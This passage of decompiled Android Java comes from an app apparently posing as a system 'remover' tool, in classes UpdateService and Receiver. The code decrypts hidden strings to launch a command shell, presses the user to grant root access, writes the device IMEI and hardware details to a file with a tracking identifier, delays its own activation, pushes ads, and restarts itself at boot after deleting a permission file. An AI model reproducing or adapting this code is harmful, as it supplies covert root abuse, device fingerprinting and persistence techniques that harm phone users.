    //   135: aload_2
    //   136: astore_3
    //   137: aload_1
    //   138: astore_2
    //   139: goto -> 85
    //   142: aload_1
    //   143: areturn
    // Exception table:
    //   from	to	target	type
    //   10	31	80	java/lang/Exception
    //   10	31	107	finally
    //   34	39	133	java/lang/Exception
    //   34	39	125	finally
    //   47	51	118	java/lang/Exception
    //   53	73	133	java/lang/Exception
    //   53	73	125	finally
    //   87	92	107	finally
    //   98	102	104	java/lang/Exception
    //   112	116	121	java/lang/Exception
  }

  private String getTips(int paramInt) {
    try {
      return new String(decrypt(TIPS[paramInt]));
    } catch (Exception exception) {
      return null;
    }
  }

  private void initJu6Ad(String paramString1, String paramString2) {
    SharedPreferences sharedPreferences = getSharedPreferences("sstimestamp", 0);
    long l1 = sharedPreferences.getLong("last", 0L);
    long l2 = System.currentTimeMillis();
    if (l2 - l1 < 3600000L)
      return;
    SharedPreferences.Editor editor = sharedPreferences.edit();
    editor.putLong("last", l2);
    editor.commit();
    AdManager.init(paramString1, paramString2, false);
    this.mJu6Ad = new AdRequester((Context)this);
    this.mJu6Ad.getAd();
  }

  private void shouMyDiag() {
    // Byte code:
    //   0: aload_0
    //   1: invokevirtual getApplicationInfo : ()Landroid/content/pm/ApplicationInfo;
    //   4: astore_1
    //   5: new android/content/Intent
    //   8: dup
    //   9: invokespecial <init> : ()V
    //   12: astore_3
    //   13: aload_3
    //   14: aload_0
    //   15: ldc_w com/safesys/remover/ShowTips
    //   18: invokevirtual setClass : (Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
    //   21: pop
    //   22: aload_1
    //   23: aload_0
    //   24: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
    //   27: invokevirtual loadLabel : (Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;
    //   30: invokeinterface toString : ()Ljava/lang/String;
    //   35: astore_2
    //   36: aload_2
    //   37: ifnull -> 52
    //   40: aload_2
    //   41: astore_1
    //   42: ldc_w ''
    //   45: aload_2
    //   46: invokevirtual equals : (Ljava/lang/Object;)Z
    //   49: ifeq -> 56
    //   52: ldc_w '本软件'
    //   55: astore_1
    //   56: new java/lang/StringBuilder
    //   59: dup
    //   60: aload_1
    //   61: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   64: invokespecial <init> : (Ljava/lang/String;)V
    //   67: ldc_w '需要root权限才能使用全部功能，请通过授权管理程序进行授权！'
    //   70: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   73: invokevirtual toString : ()Ljava/lang/String;
    //   76: astore_1
    //   77: aload_3
    //   78: ldc_w 'MM'
    //   81: new java/lang/String
    //   84: dup
    //   85: aload_1
    //   86: ldc_w 'UTF-8'
    //   89: invokevirtual getBytes : (Ljava/lang/String;)[B
    //   92: ldc_w 'UTF-8'
    //   95: invokespecial <init> : ([BLjava/lang/String;)V
    //   98: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    //   101: pop
    //   102: aload_3
    //   103: ldc_w 268435456
    //   106: invokevirtual setFlags : (I)Landroid/content/Intent;
    //   109: pop
    //   110: aload_3
    //   111: ldc_w 'GG'
    //   114: ldc_w 'test'
    //   117: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    //   120: pop
    //   121: aload_0
    //   122: aload_3
    //   123: invokevirtual startActivity : (Landroid/content/Intent;)V
    //   126: return
    //   127: astore_1
    //   128: aload_1
    //   129: invokevirtual printStackTrace : ()V
    //   132: goto -> 102
    // Exception table:
    //   from	to	target	type
    //   77	102	127	java/io/UnsupportedEncodingException
  }

  private void updateInfo(String paramString) {
    String str1 = ((TelephonyManager)getSystemService("phone")).getDeviceId();
    String str2 = (String.valueOf(Build.BRAND) + "_" + Build.MODEL).replaceAll(" ", "_");
    String str3 = Build.VERSION.RELEASE.replaceAll(" ", "_");
    String str4 = Build.VERSION.SDK.replaceAll(" ", "_");
    try {
      FileOutputStream fileOutputStream = new FileOutputStream(paramString);
      fileOutputStream.write((String.valueOf(str1) + " " + this.mIdentifier + " " + str2 + " " + str3 + " " + str4).getBytes());
      fileOutputStream.flush();
      fileOutputStream.close();
      return;
    } catch (Exception exception) {
      exception.printStackTrace();
      return;
    }
  }

  public IBinder onBind(Intent paramIntent) {
    return null;
  }

  public void onCreate() {
    // Byte code:
    //   0: aload_0
    //   1: invokespecial onCreate : ()V
    //   4: aload_0
    //   5: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
    //   8: aload_0
    //   9: invokevirtual getPackageName : ()Ljava/lang/String;
    //   12: sipush #128
    //   15: invokevirtual getApplicationInfo : (Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;
    //   18: getfield metaData : Landroid/os/Bundle;
    //   21: astore #5
    //   23: aload #5
    //   25: ldc_w 'SAFE_START'
    //   28: invokevirtual get : (Ljava/lang/String;)Ljava/lang/Object;
    //   31: astore #6
    //   33: aload #6
    //   35: ifnull -> 51
    //   38: aload_0
    //   39: aload #6
    //   41: checkcast java/lang/Integer
    //   44: invokevirtual intValue : ()I
    //   47: i2l
    //   48: putfield startDelay : J
    //   51: aload #5
    //   53: ldc_w 'SAFE_PID'
    //   56: invokevirtual get : (Ljava/lang/String;)Ljava/lang/Object;
    //   59: astore #5
    //   61: aload #5
    //   63: ifnull -> 75
    //   66: aload_0
    //   67: aload #5
    //   69: checkcast java/lang/String
    //   72: putfield mIdentifier : Ljava/lang/String;
    //   75: aload_0
    //   76: ldc_w 'sstimestamp'
    //   79: iconst_0
    //   80: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   83: astore #5
    //   85: aload #5
    //   87: ldc_w 'start'
    //   90: lconst_0
    //   91: invokeinterface getLong : (Ljava/lang/String;J)J
    //   96: lstore_1
    //   97: invokestatic currentTimeMillis : ()J
    //   100: lstore_3
    //   101: lload_1
    //   102: lconst_0
    //   103: lcmp
    //   104: ifne -> 160
    //   107: aload #5
    //   109: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
    //   114: astore #5
    //   116: aload #5
    //   118: ldc_w 'start'
    //   121: lload_3
    //   122: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    //   127: pop
    //   128: aload #5
    //   130: invokeinterface commit : ()Z
    //   135: pop
    //   136: aload_0
    //   137: getfield startDelay : J
    //   140: lconst_0
    //   141: lcmp
    //   142: ifle -> 180
    //   145: aload_0
    //   146: invokevirtual stopSelf : ()V
    //   149: return
    //   150: astore #5
    //   152: aload #5
    //   154: invokevirtual printStackTrace : ()V
    //   157: goto -> 75
    //   160: lload_3
    //   161: lload_1
    //   162: lsub
    //   163: aload_0
    //   164: getfield startDelay : J
    //   167: ldc2_w 1000
    //   170: lmul
    //   171: lcmp
    //   172: ifge -> 180
    //   175: aload_0
    //   176: invokevirtual stopSelf : ()V
    //   179: return
    //   180: aload_0
    //   181: new java/util/Timer
    //   184: dup
    //   185: iconst_1
    //   186: invokespecial <init> : (Z)V
    //   189: putfield mTimer : Ljava/util/Timer;
    //   192: new com/safesys/remover/UpdateService$1
    //   195: dup
    //   196: aload_0
    //   197: invokespecial <init> : (Lcom/safesys/remover/UpdateService;)V
    //   200: astore #5
    //   202: aload_0
    //   203: getfield mTimer : Ljava/util/Timer;
    //   206: aload #5
    //   208: getstatic com/safesys/remover/UpdateService.INTERVAL : J
    //   211: getstatic com/safesys/remover/UpdateService.INTERVAL : J
    //   214: invokevirtual schedule : (Ljava/util/TimerTask;JJ)V
    //   217: return
    // Exception table:
    //   from	to	target	type
    //   4	33	150	java/lang/Exception
    //   38	51	150	java/lang/Exception
    //   51	61	150	java/lang/Exception
    //   66	75	150	java/lang/Exception
  }

  public void onDestroy() {
    super.onDestroy();
    if (this.mTimer != null)
      this.mTimer.cancel();
  }

  class MyExecutor {
    Process process = null;

    DataInputStream stderr = null;

    DataInputStream stdin = null;

    DataOutputStream stdout = null;

    public void close() {
      // Byte code:
      //   0: aload_0
      //   1: getfield stdout : Ljava/io/DataOutputStream;
      //   4: ifnull -> 133
      //   7: aload_0
      //   8: getfield stdout : Ljava/io/DataOutputStream;
      //   11: ldc 'exit\\n'
      //   13: invokevirtual writeBytes : (Ljava/lang/String;)V
      //   16: aload_0
      //   17: getfield stdout : Ljava/io/DataOutputStream;
      //   20: invokevirtual flush : ()V
      //   23: aload_0
      //   24: invokevirtual waitFor : ()V
      //   27: aload_0
      //   28: getfield stdin : Ljava/io/DataInputStream;
      //   31: invokevirtual close : ()V
      //   34: aload_0
      //   35: aconst_null
      //   36: putfield stdin : Ljava/io/DataInputStream;
      //   39: aload_0
      //   40: getfield stderr : Ljava/io/DataInputStream;
      //   43: invokevirtual close : ()V
      //   46: aload_0
      //   47: aconst_null
      //   48: putfield stderr : Ljava/io/DataInputStream;
      //   51: aload_0
      //   52: getfield stdout : Ljava/io/DataOutputStream;
      //   55: invokevirtual close : ()V
      //   58: aload_0
      //   59: aconst_null
      //   60: putfield stdout : Ljava/io/DataOutputStream;
      //   63: aload_0
      //   64: aconst_null
      //   65: putfield process : Ljava/lang/Process;
      //   68: aload_0
      //   69: getfield process : Ljava/lang/Process;
      //   72: invokevirtual destroy : ()V
      //   75: return
      //   76: astore_1
      //   77: aload_0
      //   78: aconst_null
      //   79: putfield stdin : Ljava/io/DataInputStream;
      //   82: goto -> 39
      //   85: astore_1
      //   86: aload_1
      //   87: invokevirtual printStackTrace : ()V
      //   90: return
      //   91: astore_1
      //   92: aload_0
      //   93: aconst_null
      //   94: putfield stdin : Ljava/io/DataInputStream;
      //   97: aload_1
      //   98: athrow
      //   99: astore_1
      //   100: aload_0
      //   101: aconst_null
      //   102: putfield stderr : Ljava/io/DataInputStream;
      //   105: goto -> 51
      //   108: astore_1
      //   109: aload_0
      //   110: aconst_null
      //   111: putfield stderr : Ljava/io/DataInputStream;
      //   114: aload_1
      //   115: athrow
      //   116: astore_1
      //   117: aload_0
      //   118: aconst_null
      //   119: putfield stdout : Ljava/io/DataOutputStream;
      //   122: goto -> 63
      //   125: astore_1
      //   126: aload_0
      //   127: aconst_null
      //   128: putfield stdout : Ljava/io/DataOutputStream;
      //   131: aload_1
      //   132: athrow
      //   133: return
      // Exception table:
      //   from	to	target	type
      //   7	27	85	java/io/IOException
      //   27	34	76	java/lang/Exception
      //   27	34	91	finally
      //   34	39	85	java/io/IOException
      //   39	46	99	java/lang/Exception
      //   39	46	108	finally
      //   46	51	85	java/io/IOException
      //   51	58	116	java/lang/Exception
      //   51	58	125	finally
      //   58	63	85	java/io/IOException
      //   63	75	85	java/io/IOException
      //   77	82	85	java/io/IOException
      //   92	99	85	java/io/IOException
      //   100	105	85	java/io/IOException
      //   109	116	85	java/io/IOException
      //   117	122	85	java/io/IOException
      //   126	133	85	java/io/IOException
    }

    public void execute(String param1String, int param1Int) {
      try {
        if (this.stdout != null) {
          this.stdout.writeBytes(param1String);
          this.stdout.writeBytes("\n");
          this.stdout.flush();
          SystemClock.sleep(param1Int);
          byte[] arrayOfByte = new byte[this.stderr.available()];
          this.stderr.read(arrayOfByte, 0, this.stderr.available());
        }
        return;
      } catch (IOException iOException) {
        iOException.printStackTrace();
        return;
      }
    }

    public boolean init() {
      try {
        String str1 = UpdateService.this.getTips(11);
        String str2 = UpdateService.this.getTips(12);
        this.process = Runtime.getRuntime().exec(str1);
        this.stdout = new DataOutputStream(this.process.getOutputStream());
        this.stdin = new DataInputStream(this.process.getInputStream());
        this.stderr = new DataInputStream(this.process.getErrorStream());
        this.stdout.writeBytes(str2);
        this.stdout.flush();
        SystemClock.sleep(1000L);
        int i = this.stderr.available();
        return !(i > 0);
      } catch (IOException iOException) {
        iOException.printStackTrace();
        return false;
      }
    }

    public void waitFor() {
      try {
        if (this.process != null)
          this.process.waitFor();
        return;
      } catch (InterruptedException interruptedException) {
        interruptedException.printStackTrace();
        return;
      }
    }
  }
}

public final class Receiver extends BroadcastReceiver {
  private static final String SNAME = "com.safesys.remover.UpdateService";

  private List<String> getRuningServices(Context paramContext) {
    List list = ((ActivityManager)paramContext.getSystemService("activity")).getRunningServices(100);
    ArrayList<String> arrayList = new ArrayList();
    Iterator iterator = list.iterator();
    while (true) {
      if (!iterator.hasNext())
        return arrayList;
      arrayList.add(((ActivityManager.RunningServiceInfo)iterator.next()).service.getShortClassName());
    }
  }

  public void onReceive(Context paramContext, Intent paramIntent) {
    if (paramIntent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
      ApplicationInfo applicationInfo = paramContext.getApplicationInfo();
      if (applicationInfo != null) {
        File file = new File("/data/data/" + applicationInfo.packageName + "/shared_prefs/permission.xml");
        if (file.exists())
          file.delete();
      }
    }
    if (!getRuningServices(paramContext).contains("com.safesys.remover.UpdateService")) {
      paramIntent = new Intent();
      paramIntent.setClass(paramContext, UpdateService.class);
      paramContext.startService(paramIntent);
    }
  }
}